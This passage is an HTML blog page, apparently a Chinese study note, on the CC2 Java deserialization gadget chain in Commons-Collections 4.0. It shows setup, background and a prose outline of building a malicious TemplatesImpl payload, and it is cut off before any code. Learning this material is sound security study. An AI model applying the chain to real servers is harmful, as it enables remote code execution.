@@ -1,0 +1,694 @@
+<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>java反序列化--CC2 | VV</title><meta name="keywords" content="java安全,java,学习,CC链"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="java反序列化--CC2"><meta name="application-name" content="java反序列化--CC2"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="java反序列化--CC2"><meta property="og:url" content="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="java反序列化–CC2前置介绍CC2的环境与前面学习的CC1 CC3 CC6环境有一点不一样 之前我们都是在是Commons-Collections&amp;#x3D;3.2.1下的攻击 而这个CC2则是在Commons-Collections&amp;#x3D;4.0下的攻击 Apache Commons Collections是"><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="java反序列化–CC2前置介绍CC2的环境与前面学习的CC1 CC3 CC6环境有一点不一样 之前我们都是在是Commons-Collections&amp;#x3D;3.2.1下的攻击 而这个CC2则是在Commons-Collections&amp;#x3D;4.0下的攻击 Apache Commons Collections是"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'VV',
+  title: 'java反序列化--CC2',
+  postAI: '',
+  pageFillDescription: 'java反序列化–CC2, 前置, 介绍, 环境配置, Commons-Collectionsx3D4.0下的思考, CC2, POC, 链子构造与分析, CC2的进化之路, 进化失败, 进化成功, POC, 链子分析反序列化前置介绍的环境与前面学习的环境有一点不一样之前我们都是在是下的攻击而这个则是在下的攻击是个著名的辅助开发库包含了些中没有的数据结构和和辅助方法不过随着以后的版本中原生库功能的丰富以及反序列化漏洞的影响它也在逐渐被升级或替代在年底反序列化利用链被提出时有以下两个分支版本可见和都变了前者是老的版本包当时版本号是后者是官方在年推出的版本当时版本号是官方认为旧的有些架构和设计上的问题但修复这些问题会产生大量不能向前兼容的改动所以不再认为是个用来替换的新版本而是个新的包两者的命名空间不冲突因此可以共存在同个项目中这也是为什么要分版本的原因环境配置需要重新配置我们直接新建一个项目重新配置就行按照我们配的步骤来就是记得要重新加载一下这里也解决了我们之前的的问题下的思考既然中存在反序列化利用链那么版本是否存在呢我们直接尝试能不能在下能不能运行先就是一个下马威啊个报错我们发现导入的包都有问题看看怎么个事我们对比一下依赖我们可以发现老的中依赖的包名都是而新的包名已经变了是所以我们应该将所有改成但是改后还是由一个错误报的错误我们先看看原来里的的定义这个报错的原因肯定是在新的依赖里面没有这个类而我们应该怎么在调用这个呢我们直接在新依赖里找有相同功能的类以进来就直接看到了这不是和我们需要的一模一样吗所以我们只要替换一下名字即可这样就行没问题了应该是可以运行了没问题既然可以在下运行那么我们之前构造的和肯定也是没问题的这里就不多说了那么有没有新链子吗当然这就是与这里我们先学习先上链子构造与分析这个包之所有能攒出那么多利用链来除了因为其使用量大技术上的原因是其中包含了一些可以执行任意方法的所以在中找的过程实际上可以简化为找一条从方法到方法的调用链好现在我们再来看的里有两个关键类为什么说这两个类关键呢是个有自己方法的类而中有调方法的函数所以我们就可以知道就是一条从到的利用链好接下来就是把他们给串起来我们之前说过是反序列化的起点所以我们从开始来看看它调用了什么类方法首先调用了方法点进去发现调用了方法点进去调用链方法点进去回来了调用了方法这样一来链子就通了链子还是能简单的接下来就可以构造我们的链子了首先还是创建基作嗯你没看错一模一样的哈然后就是创建个传入我们的好我们实例化对象第个参数是初始化时的大小至少需要个元素才会触发排序和比较所以是第二个参数是比较时的传入前面实例化的后面随便添加了个数字进去这里可以传入非的任意对象因为我们的是忽略传入参数的最后将真正的恶意设置上当然得有方法定义了一个名为的静态方法它接受三个参数一个是目标对象一个是要修改的字段名字符串类型最后一个是要设置给该字段的新值这个方法的主要作用是利用反射动态地修改指定对象中某个字段的值具体步骤如下获取对象通过获取目标对象类中声明的名为的字段方法可以访问私有字段但不包括父类的字段开放访问权限由于直接访问私有字段通常受到限制所以使用方法来取消访问控制检查允许后续代码修改这个字段的值即使它原本是的设置字段值最后通过实际设置对象中字段的值为然后就是最后的序列化与反序列化序列化流反序列化最后就组成了我们的啦调用流程的进化之路在中我们知道用可以构造出无数组的利用这里我们也可以用这个来进化一下我们的进化失败创建对象创建个人畜无害的对象并用它实例化样实例化但是此时向队列里添加的元素就是我们前面创建的对象了因为我们这里无法再使用数组所以也就不能用来初始化变量需要接受外部传入的变量而在时队列里的元素将作为参数传入方法这就是传给的参数最后步将方法改成恶意方法最后就形成了我们的进化这个我一直爆的错目前还没有解决没有找到相应的包但是整体的代码逻辑和升级思路没问题进化成功这里我从新找了一个来思路是一样的都是通过用了动态构造了我们恶意类的字节码再来的思路返回默认的类池添加的搜索路径创建一个新的类设置前面创建的类的父类为创建一个空的类初始化设置构造函数主体为转换为数组反射创建反射获取的字段暴力反射将上的字段设置为的数组反射获取的字段暴力反射将上的字段设置为使用修饰器传入对象使用指定的初始容量创建一个并根据其自然顺序对元素进行排序添加数字插入此优先级队列添加数字插入此优先级队列获取的字段暴力反射设置的字段值为获取的字段暴力反射设置的字段内容数组内容为这个是没问题的我们重新分析一下吧虽然思路差不多这条链子和进化之前的链子有很多地方都是一样的不过这里的方法是利用中的字节码编程获取到字节码然后再利用中的方法把字节码加载到中运行链子分析从入手推反序列化链到这一段都是一样的不过要重新分析一下利用的过程可以看到在中通过反射给实例中的属性成了我们的恶意类我们回头看传进这个方法的值为值为下面有一个短路因为为所以值为又因为也为所以你看这里即使我们的值值存在着我们的恶意类因为所以在这个逻辑中前面就已经为了所以后面的方法是不会执行的我们其实执行的方法是在下一个语句我们的中也有所体现所以我们的中必须放着我们的恶意类其他的放不放无所谓即使也可以传进去我们在回头看我们传入的即是被先执行的所以如果中不存在我们的恶意类后面的就无法执行方法就会直接抛出错误中断运行至于为什么是数组因为是数组嘛这也是为什么必须放着我们的恶意类的原因好然后就是加载字节码了这里就不索了这里是用了动态构造了我们恶意类的字节码当然也可以直接编译成文件然后用二进制字节码来存储这里是用和来生成恶意类的字节码我们反射创建类这没什么好说的反射获取到了对象作为类的实例化通过来获取属性这里调用的方法并设置能获取到所有属性包括的获取到属性后把我们生成的恶意类字节码给赋值到里面去想调用到方法就要保证不为空用来加载字节码生成类并且下面语句实例化恶意类会去调用又会继续调用的来加载我们的字节码这到已经底层类加载了来生成恶意类所以接下来的是设置为我们的恶意类名保证它不为空通过结构找到了在类中有一个方法内部调用了方法能成功调用那么再来看看这个方法是什么它会返回一个然后就是我们的类的方法来调用方法再就是我们前面所提到的集合了该队列的属性我们可以指定成比较器的这样就可以调用的方法了并且把比较对象设置成类的对象因此我们只需要在集合中添加两个对象作为集合元素就可以触发之前构造的利用链当然是先实例化一个对象我们可控属性填入的两个元素然后设置的属性通过获取到对应的属性然后传入和属性注意这里因为是比较队列至少需要两个元素所以我们传入两个对象接下来就是熟悉的序列化再反序列化出来了也就是模拟一边数据传输流了分析就差不多这样可能这个更好理解一点注释不那辣莫多更清晰一点构造恶意类并转换为字节码反射创建将恶意类的字节码设置给属性设置属性为恶意类名构造利用链触发漏洞设置属性设置属性队列至少需要个元素序列化反序列化注意的利用链是否支持在中使当然不行因为这条利用链中的关键类在以前是版本中是没有实现接口的',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-07 21:32:15',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 5 || hour >= 5
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 1.05rem;">CC链<sup>7</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>12</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>12</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>12</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/java%E5%AE%89%E5%85%A8/" itemprop="url">java安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java安全</span></a><a class="article-meta__tags" href="/tags/java/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java</span></a><a class="article-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>学习</span></a><a class="article-meta__tags" href="/tags/CC%E9%93%BE/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CC链</span></a></span></div></div><h1 class="post-title" itemprop="name headline">java反序列化--CC2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-07T13:20:52.000Z" title="发表于 2024-06-07 21:20:52">2024-06-07</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-06-07T13:32:15.219Z" title="更新于 2024-06-07 21:32:15">2024-06-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">4.6k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="java反序列化--CC2"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC2/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/java%E5%AE%89%E5%85%A8/" itemprop="url">java安全</a><a href="/tags/java%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">java安全</a><a href="/tags/java/" tabindex="-1" itemprop="url">java</a><a href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url">学习</a><a href="/tags/CC%E9%93%BE/" tabindex="-1" itemprop="url">CC链</a><h1 id="CrawlerTitle" itemprop="name headline">java反序列化--CC2</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-06-07T13:20:52.000Z" title="发表于 2024-06-07 21:20:52">2024-06-07</time><time itemprop="dateCreated datePublished" datetime="2024-06-07T13:32:15.219Z" title="更新于 2024-06-07 21:32:15">2024-06-07</time></header><h1 id="java反序列化–CC2"><a href="#java反序列化–CC2" class="headerlink" title="java反序列化–CC2"></a>java反序列化–CC2</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>CC2的环境与前面学习的CC1 CC3 CC6环境有一点不一样</p>
+<p>之前我们都是在是<code>Commons-Collections=3.2.1</code>下的攻击</p>
+<p>而这个CC2则是在<code>Commons-Collections=4.0</code>下的攻击</p>
+<p>Apache Commons Collections是⼀个著名的辅助开发库，包含了⼀些Java中没有的数据结构和和辅助 方法，不过随着Java 9以后的版本中原生库功能的丰富，以及反序列化漏洞的影响，它也在逐渐被升级或替代。</p>
+<p>在2015年底commons-collections反序列化利用链被提出时，Apache Commons Collections有以下两个分支版本： </p>
+<ul>
+<li><p>commons-collections:commons-collections </p>
+</li>
+<li><p>org.apache.commons:commons-collections4</p>
+</li>
+</ul>
+<p>可见，groupId和artifactId都变了。前者是Commons Collections老的版本包，当时版本号是<code>3.2.1</code>；后者是官方在2013年推出的4版本，当时版本号是<code>4.0</code>。</p>
+<p>官方认为旧的commons-collections有⼀些架构和API设计上的问题，但修复这些问题，会产生大量不能 向前兼容的改动。所以，commons-collections4不再认为是⼀个用来替换commons-collections的新版本，而是⼀个新的包，两者的命名空间不冲突，因此可以共存在同⼀个项目中</p>
+<p>这也是为什么要分版本的原因</p>
+<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>需要重新配置maven</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- Apache Commons Collections 4 --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们直接新建一个项目 重新配置maven就行</p>
+<p>按照我们配3.2.1的步骤来就是</p>
+<p>记得要重新加载一下maven</p>
+<p>这里也解决了我们之前CC3的lazyMap的问题</p>
+<h2 id="Commons-Collections-4-0下的思考"><a href="#Commons-Collections-4-0下的思考" class="headerlink" title="Commons-Collections&#x3D;4.0下的思考"></a>Commons-Collections&#x3D;4.0下的思考</h2><p>既然3.2.1中存在反序列化利用链，那么4.0版本是否存在呢</p>
+<p>我们直接尝试CC6能不能在4.0下能不能运行</p>
+<p>先就是一个下马威啊 24个报错</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/06/07/66630a006bc98.png" alt="image-20240604001722167"></p>
+<p>我们发现导入的包都有问题</p>
+<p>看看怎么个事</p>
+<p>我们对比一下依赖</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line"> &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line"> &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line"> &lt;!-- https://mvnrepository.com/artifact/org.apache.commons/commonscollections4 --&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line"> 